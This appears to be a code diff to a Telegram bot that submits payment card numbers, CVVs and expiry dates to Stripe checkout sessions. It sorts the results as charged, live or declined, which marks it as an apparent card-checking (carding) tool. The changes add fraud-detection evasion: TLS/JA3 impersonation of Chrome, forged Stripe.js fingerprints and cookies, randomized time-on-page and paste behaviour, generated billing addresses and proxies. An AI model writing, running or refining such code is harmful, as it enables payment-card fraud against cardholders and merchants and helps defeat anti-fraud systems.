@@ -9,6 +9,13 @@ import os
 import uuid
 import string
 from urllib.parse import unquote
+
+# TLS/JA3 fingerprint impersonation (makes requests look like real Chrome)
+try:
+    from curl_cffi.requests import AsyncSession as CurlAsyncSession
+    HAS_CURL_CFFI = True
+except ImportError:
+    HAS_CURL_CFFI = False
 from aiogram import Router
 from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
 from aiogram.filters import Command
@@ -821,7 +828,8 @@ async def get_checkout_info(url: str) -> dict:
         
         if result["pk"] and result["cs"]:
             s = await get_session()
-            body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"
+            _init_eid = generate_eid()
+            body = f"key={result['pk']}&eid={_init_eid}&browser_locale=en-US&redirect_type=url"
             
             async with s.post(
                 f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
@@ -921,138 +929,167 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
     for attempt in range(max_retries + 1):
         try:
             proxy_url = get_proxy_url(proxy_str) if proxy_str else None
-            connector = aiohttp.TCPConnector(limit=100, ssl=False)
-            async with aiohttp.ClientSession(connector=connector) as s:
-                email = init_data.get("customer_email") or "john@example.com"
-                checksum = init_data.get("init_checksum", "")
+            
+            email = init_data.get("customer_email") or "john@example.com"
+            checksum = init_data.get("init_checksum", "")
+            
+            lig = init_data.get("line_item_group")
+            inv = init_data.get("invoice")
+            if lig:
+                total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
+            elif inv:
+                total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
+            else:
+                pi = init_data.get("payment_intent") or {}
+                total = subtotal = pi.get("amount", 0)
+            
+            cust = init_data.get("customer") or {}
+            addr = cust.get("address") or {}
+            
+            # Use customer data if available, otherwise random billing
+            if cust.get("name") or addr.get("line1"):
+                name = cust.get("name") or "John Smith"
+                country = addr.get("country") or "US"
+                line1 = addr.get("line1") or "742 Evergreen Terrace"
+                city = addr.get("city") or "Springfield"
+                state = addr.get("state") or "IL"
+                zip_code = addr.get("postal_code") or "62704"
+            else:
+                billing = get_random_billing()
+                name = billing["name"]
+                country = billing["country"]
+                line1 = billing["line1"]
+                city = billing["city"]
+                state = billing["state"]
+                zip_code = billing["zip"]
+            
+            if attempt > 0:
+                print(f"[DEBUG] Retry attempt {attempt}...")
+            
+            # Generate Stripe.js fingerprints (muid persistent per user)
+            fp = generate_stripe_fingerprints(user_id)
+            time_on_page = random.randint(8000, 90000)  # 8-90 seconds (realistic range)
+            eid = generate_eid()
+            
+            # Randomize pasted_fields (real users sometimes paste, sometimes type)
+            pasted = random.choice(["number", "number", "number", ""])
+            
+            print(f"[DEBUG] Stripe.js Emulation: Confirming with fingerprints + TLS impersonation...")
+            
+            # Build confirm body — Stripe.js style with full card data + fingerprints
+            conf_body = (
+                f"eid={eid}"
+                f"&payment_method_data[type]=card"
+                f"&payment_method_data[card][number]={card['cc']}"
+                f"&payment_method_data[card][cvc]={card['cvv']}"
+                f"&payment_method_data[card][exp_month]={card['month']}"
+                f"&payment_method_data[card][exp_year]={card['year']}"
+                f"&payment_method_data[billing_details][name]={name}"
+                f"&payment_method_data[billing_details][email]={email}"
+                f"&payment_method_data[billing_details][address][country]={country}"
+                f"&payment_method_data[billing_details][address][line1]={line1}"
+                f"&payment_method_data[billing_details][address][city]={city}"
+                f"&payment_method_data[billing_details][address][postal_code]={zip_code}"
+                f"&payment_method_data[billing_details][address][state]={state}"
+                f"&payment_method_data[guid]={fp['guid']}"
+                f"&payment_method_data[muid]={fp['muid']}"
+                f"&payment_method_data[sid]={fp['sid']}"
+                f"&payment_method_data[payment_user_agent]={get_random_stripe_js_agent()}"
+                f"&payment_method_data[time_on_page]={time_on_page}"
+            )
+            if pasted:
+                conf_body += f"&payment_method_data[pasted_fields]={pasted}"
+            conf_body += (
+                f"&expected_amount={total}"
+                f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
+                f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
+                f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
+                f"&last_displayed_line_item_group_details[total_discount_amount]=0"
+                f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
+                f"&expected_payment_method_type=card"
+                f"&key={pk}"
+                f"&init_checksum={checksum}"
+            )
+            
+            # Headers with Stripe cookies (mimics real browser)
+            headers = get_headers(stripe_js=True)
+            headers["Cookie"] = get_stripe_cookies(fp)
+            
+            # Use curl_cffi for TLS/JA3 fingerprint impersonation if available
+            if HAS_CURL_CFFI:
+                try:
+                    async with CurlAsyncSession(impersonate="chrome131") as curl_s:
+                        resp = await curl_s.post(
+                            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                            headers=headers,
+                            data=conf_body,
+                            proxy=proxy_url,
+                            timeout=25,
+                        )
+                        conf = resp.json()
+                except Exception as curl_err:
+                    print(f"[DEBUG] curl_cffi failed, falling back to aiohttp: {str(curl_err)[:40]}")
+                    connector = aiohttp.TCPConnector(limit=100, ssl=False)
+                    async with aiohttp.ClientSession(connector=connector) as s:
+                        async with s.post(
+                            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                            headers=headers, data=conf_body, proxy=proxy_url
+                        ) as r:
+                            conf = await r.json()
+            else:
+                connector = aiohttp.TCPConnector(limit=100, ssl=False)
+                async with aiohttp.ClientSession(connector=connector) as s:
+                    async with s.post(
+                        f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
+                        headers=headers, data=conf_body, proxy=proxy_url
+                    ) as r:
+                        conf = await r.json()
+            
+            print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")
+            
+            if "error" in conf:
+                err = conf["error"]
+                dc = err.get("decline_code", "")
+                msg = err.get("message", "Failed")
+                err_code = err.get("code", "")
                 
-                lig = init_data.get("line_item_group")
-                inv = init_data.get("invoice")
-                if lig:
-                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
-                elif inv:
-                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
+                # Check if checkout already succeeded (payment already processed)
+                if err_code == 'checkout_succeeded_session' or 'already been processed' in msg.lower():
+                    result["status"] = "CHECKOUT_COMPLETED"
+                # Check if session is expired/inactive/canceled
+                elif err_code in ('checkout_not_active_session', 'payment_intent_unexpected_state') or 'no longer active' in msg.lower() or 'status of canceled' in msg.lower():
+                    result["status"] = "SESSION_EXPIRED"
+                # Check if decline code indicates card is LIVE
+                elif dc in LIVE_DECLINE_CODES:
+                    result["status"] = "LIVE"
                 else:
-                    pi = init_data.get("payment_intent") or {}
-                    total = subtotal = pi.get("amount", 0)
-                
-                cust = init_data.get("customer") or {}
-                addr = cust.get("address") or {}
-                
-                # Use customer data if available, otherwise random billing
-                if cust.get("name") or addr.get("line1"):
-                    name = cust.get("name") or "John Smith"
-                    country = addr.get("country") or "US"
-                    line1 = addr.get("line1") or "742 Evergreen Terrace"
-                    city = addr.get("city") or "Springfield"
-                    state = addr.get("state") or "IL"
-                    zip_code = addr.get("postal_code") or "62704"
+                    result["status"] = "DECLINED"
+                if dc:
+                    result["response"] = f"[{dc}] [{msg}]"
+                elif err_code:
+                    result["response"] = f"[{err_code}] [{msg}]"
                 else:
-                    billing = get_random_billing()
-                    name = billing["name"]
-                    country = billing["country"]
-                    line1 = billing["line1"]
-                    city = billing["city"]
-                    state = billing["state"]
-                    zip_code = billing["zip"]
-                
-                if attempt > 0:
-                    print(f"[DEBUG] Retry attempt {attempt}...")
-                
-                # Generate Stripe.js fingerprints (muid persistent per user)
-                fp = generate_stripe_fingerprints(user_id)
-                time_on_page = random.randint(15000, 120000)
-                eid = generate_eid()
-                
-                print(f"[DEBUG] Stripe.js Emulation: Confirming directly with fingerprints...")
-                
-                # Build confirm body — Stripe.js style with full card data + fingerprints
-                conf_body = (
-                    f"eid={eid}"
-                    f"&payment_method_data[type]=card"
-                    f"&payment_method_data[card][number]={card['cc']}"
-                    f"&payment_method_data[card][cvc]={card['cvv']}"
-                    f"&payment_method_data[card][exp_month]={card['month']}"
-                    f"&payment_method_data[card][exp_year]={card['year']}"
-                    f"&payment_method_data[billing_details][name]={name}"
-                    f"&payment_method_data[billing_details][email]={email}"
-                    f"&payment_method_data[billing_details][address][country]={country}"
-                    f"&payment_method_data[billing_details][address][line1]={line1}"
-                    f"&payment_method_data[billing_details][address][city]={city}"
-                    f"&payment_method_data[billing_details][address][postal_code]={zip_code}"
-                    f"&payment_method_data[billing_details][address][state]={state}"
-                    f"&payment_method_data[guid]={fp['guid']}"
-                    f"&payment_method_data[muid]={fp['muid']}"
-                    f"&payment_method_data[sid]={fp['sid']}"
-                    f"&payment_method_data[payment_user_agent]={get_random_stripe_js_agent()}"
-                    f"&payment_method_data[time_on_page]={time_on_page}"
-                    f"&payment_method_data[pasted_fields]=number"
-                    f"&expected_amount={total}"
-                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
-                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
-                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
-                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
-                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
-                    f"&expected_payment_method_type=card"
-                    f"&key={pk}"
-                    f"&init_checksum={checksum}"
-                )
-                
-                headers = get_headers(stripe_js=True)
-                
-                async with s.post(
-                    f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
-                    headers=headers,
-                    data=conf_body,
-                    proxy=proxy_url
-                ) as r:
-                    conf = await r.json()
-                
-                print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")
-                
-                if "error" in conf:
-                    err = conf["error"]
-                    dc = err.get("decline_code", "")
-                    msg = err.get("message", "Failed")
-                    err_code = err.get("code", "")
-                    
-                    # Check if checkout already succeeded (payment already processed)
-                    if err_code == 'checkout_succeeded_session' or 'already been processed' in msg.lower():
-                        result["status"] = "CHECKOUT_COMPLETED"
-                    # Check if session is expired/inactive/canceled
-                    elif err_code in ('checkout_not_active_session', 'payment_intent_unexpected_state') or 'no longer active' in msg.lower() or 'status of canceled' in msg.lower():
-                        result["status"] = "SESSION_EXPIRED"
-                    # Check if decline code indicates card is LIVE
-                    elif dc in LIVE_DECLINE_CODES:
-                        result["status"] = "LIVE"
-                    else:
-                        result["status"] = "DECLINED"
-                    if dc:
-                        result["response"] = f"[{dc}] [{msg}]"
-                    elif err_code:
-                        result["response"] = f"[{err_code}] [{msg}]"
-                    else:
-                        result["response"] = msg
-                    print(f"[DEBUG] Decline: {dc or err_code} - {msg}")
+                    result["response"] = msg
+                print(f"[DEBUG] Decline: {dc or err_code} - {msg}")
+            else:
+                pi = conf.get("payment_intent") or {}
+                st = pi.get("status", "") or conf.get("status", "")
+                if st == "succeeded":
+                    result["status"] = "CHARGED"
+                    result["response"] = "Payment Successful ✅💚"
+                elif st == "requires_action":
+                    result["status"] = "3DS"
+                    result["response"] = "3DS Skipped"
+                elif st == "requires_payment_method":
+                    result["status"] = "DECLINED"
+                    result["response"] = "Card Declined"
                 else:
-                    pi = conf.get("payment_intent") or {}
-                    st = pi.get("status", "") or conf.get("status", "")
-                    if st == "succeeded":
-                        result["status"] = "CHARGED"
-                        result["response"] = "Payment Successful ✅💚"
-                    elif st == "requires_action":
-                        result["status"] = "3DS"
-                        result["response"] = "3DS Skipped"
-                    elif st == "requires_payment_method":
-                        result["status"] = "DECLINED"
-                        result["response"] = "Card Declined"
-                    else:
-                        result["status"] = "UNKNOWN"
-                        result["response"] = st or "Unknown"
-                
-                result["time"] = round(time.perf_counter() - start, 2)
-                print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
-                return result
+                    result["status"] = "UNKNOWN"
+                    result["response"] = st or "Unknown"
+            
+            result["time"] = round(time.perf_counter() - start, 2)
+            print(f"[DEBUG] Final: {result['status']} - {result['response']} ({result['time']}s)")
+            return result
                     
         except Exception as e:
             err_str = str(e)
@@ -1074,7 +1111,8 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
 async def check_checkout_active(pk: str, cs: str) -> bool:
     try:
         s = await get_session()
-        body = f"key={pk}&eid=NA&browser_locale=en-US&redirect_type=url"
+        _chk_eid = generate_eid()
+        body = f"key={pk}&eid={_chk_eid}&browser_locale=en-US&redirect_type=url"
         async with s.post(
             f"https://api.stripe.com/v1/payment_pages/{cs}/init",
             headers=get_headers(),
